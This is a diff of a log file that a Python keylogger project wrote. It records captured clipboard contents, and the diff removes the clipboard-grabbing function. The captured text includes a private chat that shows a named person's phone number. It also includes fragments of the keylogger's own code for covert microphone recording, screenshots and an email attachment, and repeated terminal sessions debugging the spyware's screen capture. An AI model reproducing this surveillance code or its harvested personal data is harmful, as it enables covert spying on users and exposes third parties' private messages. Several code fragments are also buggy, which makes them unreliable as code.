@@ -1,25 +1,223 @@
-Clipboard could not be copied. Error: Pyperclip could not find a copy/paste mechanism for your system. For more information, please visit https://pyperclip.readthedocs.io/en/latest/index.html#not-implemented-error
-On Linux, you can run `sudo apt-get install xclip` or `sudo apt-get install xselect` to install a copy/paste mechanism.
 Clipboard Data: 
-import pyperclip
+zero trust architecture in devops
+Clipboard Data: 
+[9:25 am, 19/12/2024] Tanishk Mirkale Cdac: telegram la ptv mg
+[9:25 am, 19/12/2024] v_SankeT_: Number
+[9:25 am, 19/12/2024] Tanishk Mirkale Cdac: 7972261765
+[9:25 am, 19/12/2024] v_SankeT_: ?
+[9:26 am, 19/12/2024] Tanishk Mirkale Cdac: ha vala pn number ahe
+[9:26 am, 19/12/2024] Tanishk Mirkale Cdac: ani regular vla pn ae
+[9:27 am, 19/12/2024] Tanishk Mirkale Cdac: msg tkla telegram la tula
+[9:27 am, 19/12/2024] v_SankeT_: Aala ka bagh msg
+[9:27 am, 19/12/2024] Tanishk Mirkale Cdac: ha
+[7:37 am, 20/12/2024] v_SankeT_: Aala ka Khali?
+[7:37 am, 20/12/2024] v_SankeT_: Late hotaye mala
+[9:28 pm, 20/12/2024] Tanishk Mirkale Cdac: Udya ny yenr mi
+[10:57 am, 21/12/2024] v_SankeT_: mi pan nahi gelo
+[10:58 am, 21/12/2024] Tanishk Mirkale Cdac: acha
+Clipboard Data: 
 
-def copy_clipboard():
-    clipboard_information = "clipboard_info.txt"  # Ensure this variable is defined or passed as an argument
-    file_path = "/home/vblueice/BlueIce/Python-keylogger/project"  # Ensure this variable is defined
-    
-    with open(file_path + extend + clipboard_information, "a") as f: 
-        try:
-            # Get clipboard data using pyperclip
-            pasted_data = pyperclip.paste()
-
-            f.write("Clipboard Data: \n" + pasted_data + "\n")
-
-        except Exception as e: 
-            f.write("Clipboard could not be copied. Error: " + str(e) + "\n")
-    
-copy_clipboard()
 
 Clipboard Data: 
-App passwords help you sign into your Google Account on older apps and services that don’t support modern security standards.
 
-App passwords are less secure than using up-to-date apps and services that use modern security standards. Before you create an app password, you should check to see if your app needs this in order to sign in.
+
+Clipboard Data: 
+
+
+Clipboard Data: 
+
+
+Clipboard Data: 
+def microphone():
+    fz = 44100
+    seconds = microphone_time
+
+    my_recording = sd.rec(int(seconds ^ fz), samplerate=fz, channels=2) 
+    sd.wait()
+    write(file_path + extend + audio_information, fz, my_recording)
+
+microphone()
+
+Clipboard Data: 
+dtype='int16'
+Clipboard Data: 
+screenshot_information
+Clipboard Data: 
+def screenshot():
+    with mss.mss() as sct: 
+        sct.shot(ouput=file_path+extend+screenshot_information)
+    
+screenshot()
+
+Clipboard Data: 
+sudo dnf install libX11 libXext libXtst libXrandr
+
+Clipboard Data: 
+python3 project/keylogger.py
+
+Clipboard Data: 
+python3 project/keylogger.py
+
+Clipboard Data: 
+sudo -E DISPLAY=$DISPLAY XAUTHORITY=$HOME/.Xauthority python3 /home/vblueice/BlueIce/Python-keylogger/project/keylogger.py
+
+Clipboard Data: 
+
+ * Please make sure that you have an X server running, and that the DISPLAY environment variable is set correctly
+❯ ls -la ~/.Xauthority
+
+ls: cannot access '/home/vblueice/.Xauthority': No such file or directory
+❯ sudo chown vblueice:vblueice ~/.Xauthority
+sudo chmod 600 ~/.Xauthority
+
+chown: cannot access '/home/vblueice/.Xauthority': No such file or directory
+chmod: cannot access '/home/vblueice/.Xauthority': No such file or directory
+❯ sudo -u vblueice touch ~/.Xauthority
+
+❯ sudo chown vblueice:vblueice ~/.Xauthority
+
+❯ sudo chmod 600 ~/.Xauthority
+
+❯ ps aux | grep Xorg
+
+vblueice    9056  0.0  0.0 227792  2320 pts/4    S+   18:24   0:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox --exclude-dir=.venv --exclude-dir=venv Xorg
+❯ cat /var/log/Xorg.0.log | grep -i "auth"
+
+cat: /var/log/Xorg.0.log: No such file or directory
+❯ sudo -E DISPLAY=$DISPLAY XAUTHORITY=$HOME/.Xauthority python3 /home/vblueice/BlueIce/Python-keylogger/project/keylogger.py
+
+Xlib.xauth: warning, no xauthority details available
+Xlib.xauth: warning, no xauthority details available
+Xlib.xauth: warning, no xauthority details available
+Xlib.xauth: warning, no xauthority details available
+Xlib.xauth: warning, no xauthority details available
+Clipboard Data: 
+
+ * Please make sure that you have an X server running, and that the DISPLAY environment variable is set correctly
+❯ ls -la ~/.Xauthority
+
+ls: cannot access '/home/vblueice/.Xauthority': No such file or directory
+❯ sudo chown vblueice:vblueice ~/.Xauthority
+sudo chmod 600 ~/.Xauthority
+
+chown: cannot access '/home/vblueice/.Xauthority': No such file or directory
+chmod: cannot access '/home/vblueice/.Xauthority': No such file or directory
+❯ sudo -u vblueice touch ~/.Xauthority
+
+❯ sudo chown vblueice:vblueice ~/.Xauthority
+
+❯ sudo chmod 600 ~/.Xauthority
+
+❯ ps aux | grep Xorg
+
+vblueice    9056  0.0  0.0 227792  2320 pts/4    S+   18:24   0:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox --exclude-dir=.venv --exclude-dir=venv Xorg
+❯ cat /var/log/Xorg.0.log | grep -i "auth"
+
+cat: /var/log/Xorg.0.log: No such file or directory
+❯ sudo -E DISPLAY=$DISPLAY XAUTHORITY=$HOME/.Xauthority python3 /home/vblueice/BlueIce/Python-keylogger/project/keylogger.py
+
+Xlib.xauth: warning, no xauthority details available
+Xlib.xauth: warning, no xauthority details available
+Xlib.xauth: warning, no xauthority details available
+Xlib.xauth: warning, no xauthority details available
+Xlib.xauth: warning, no xauthority details available
+Clipboard Data: 
+
+ * Please make sure that you have an X server running, and that the DISPLAY environment variable is set correctly
+❯ ls -la ~/.Xauthority
+
+ls: cannot access '/home/vblueice/.Xauthority': No such file or directory
+❯ sudo chown vblueice:vblueice ~/.Xauthority
+sudo chmod 600 ~/.Xauthority
+
+chown: cannot access '/home/vblueice/.Xauthority': No such file or directory
+chmod: cannot access '/home/vblueice/.Xauthority': No such file or directory
+❯ sudo -u vblueice touch ~/.Xauthority
+
+❯ sudo chown vblueice:vblueice ~/.Xauthority
+
+❯ sudo chmod 600 ~/.Xauthority
+
+❯ ps aux | grep Xorg
+
+vblueice    9056  0.0  0.0 227792  2320 pts/4    S+   18:24   0:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox --exclude-dir=.venv --exclude-dir=venv Xorg
+❯ cat /var/log/Xorg.0.log | grep -i "auth"
+
+cat: /var/log/Xorg.0.log: No such file or directory
+❯ sudo -E DISPLAY=$DISPLAY XAUTHORITY=$HOME/.Xauthority python3 /home/vblueice/BlueIce/Python-keylogger/project/keylogger.py
+
+Xlib.xauth: warning, no xauthority details available
+Xlib.xauth: warning, no xauthority details available
+Xlib.xauth: warning, no xauthority details available
+Xlib.xauth: warning, no xauthority details available
+Xlib.xauth: warning, no xauthority details available
+Clipboard Data: 
+
+Clipboard Data: 
+
+Clipboard Data: 
+
+Clipboard Data: 
+sudo apt install gnome-screenshot
+Clipboard Data: 
+ p = MIMEBase('application', 'octet-stream')
+Clipboard Data: 
+import mss
+
+def capture_screenshot():
+    with mss.mss() as sct:
+        # Capture the screen and save it to the file path
+        sct.shot(output=file_path + extend + screenshot_information)
+
+capture_screenshot()
+
+Clipboard Data: 
+[vblueice@fedora]~/BlueIce/Python-keylogger% /usr/bin/python /home/vblueice/BlueIce/Python-key
+logger/project/keylogger.py
+Traceback (most recent call last):
+  File "/home/vblueice/BlueIce/Python-keylogger/project/keylogger.py", line 183, in <module>
+    capture_screenshot()
+  File "/home/vblueice/BlueIce/Python-keylogger/project/keylogger.py", line 181, in capture_screenshot
+    sct.shot(output=file_path + extend + screenshot_information)
+  File "/home/vblueice/.local/lib/python3.12/site-packages/mss/base.py", line 200, in shot
+    return next(self.save(**kwargs))
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/vblueice/.local/lib/python3.12/site-packages/mss/base.py", line 191, in save
+    sct = self.grab(monitor)
+          ^^^^^^^^^^^^^^^^^^
+  File "/home/vblueice/.local/lib/python3.12/site-packages/mss/base.py", line 101, in grab
+    screenshot = self._grab_impl(monitor)
+                 ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/vblueice/.local/lib/python3.12/site-packages/mss/linux.py", line 428, in _grab_impl
+    ximage = self.xlib.XGetImage(
+             ^^^^^^^^^^^^^^^^^^^^
+  File "/home/vblueice/.local/lib/python3.12/site-packages/mss/linux.py", line 230, in _validate
+    raise ScreenShotError(msg, details=details)
+mss.exception.ScreenShotError: XGetImage() failed
+Clipboard Data: 
+[vblueice@fedora]~/BlueIce/Python-keylogger% /usr/bin/python /home/vblueice/BlueIce/Python-key
+logger/project/keylogger.py
+Traceback (most recent call last):
+  File "/home/vblueice/BlueIce/Python-keylogger/project/keylogger.py", line 183, in <module>
+    capture_screenshot()
+  File "/home/vblueice/BlueIce/Python-keylogger/project/keylogger.py", line 181, in capture_screenshot
+    sct.shot(output=file_path + extend + screenshot_information)
+  File "/home/vblueice/.local/lib/python3.12/site-packages/mss/base.py", line 200, in shot
+    return next(self.save(**kwargs))
+           ^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/vblueice/.local/lib/python3.12/site-packages/mss/base.py", line 191, in save
+    sct = self.grab(monitor)
+          ^^^^^^^^^^^^^^^^^^
+  File "/home/vblueice/.local/lib/python3.12/site-packages/mss/base.py", line 101, in grab
+    screenshot = self._grab_impl(monitor)
+                 ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/vblueice/.local/lib/python3.12/site-packages/mss/linux.py", line 428, in _grab_impl
+    ximage = self.xlib.XGetImage(
+             ^^^^^^^^^^^^^^^^^^^^
+  File "/home/vblueice/.local/lib/python3.12/site-packages/mss/linux.py", line 230, in _validate
+    raise ScreenShotError(msg, details=details)
+mss.exception.ScreenShotError: XGetImage() failed
+Clipboard Data: 
+
+Clipboard Data: 
+
